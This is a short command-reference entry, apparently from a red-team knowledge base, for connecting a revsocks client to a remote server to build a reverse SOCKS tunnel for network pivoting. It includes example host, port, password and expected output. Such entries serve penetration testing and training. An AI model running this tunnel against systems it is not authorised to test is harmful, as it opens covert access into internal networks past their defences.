---
id: fab9ba38-205a-4b1e-b691-13f9130c2ff9
name: revsocks-connect-client-basic
type: command
executor: bash
data: './revsocks -connect $_SERVER_IP:8443 -pass $_PASSWORD'
output: null
created_at: '2023-04-06T03:56:22.907156Z'
updated_at: '2023-04-10T20:25:18.397562Z'
platforms:
  - Linux
  - Windows
tags:
  - proxy
  - pivoting
verified: true
validated: true
---

# revsocks-connect-client-basic

## Command

```bash
./revsocks -connect $_SERVER_IP:8443 -pass $_PASSWORD
```

## Description

Connects the client to the revsocks server to establish a basic reverse tunnel.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -connect $_SERVER_IP:8443 | Server address/port | Yes |
| -pass $_PASSWORD | Authentication password | Yes |

## Examples

### Basic Usage

```bash
./revsocks -connect 10.10.10.10:8443 -pass Password1234
```

## Expected Output

Connected to 10.10.10.10:8443
Authenticated successfully
Tunnel established

## Related

- [[procedures/Reverse-SOCKS-Proxy-Pivoting]]
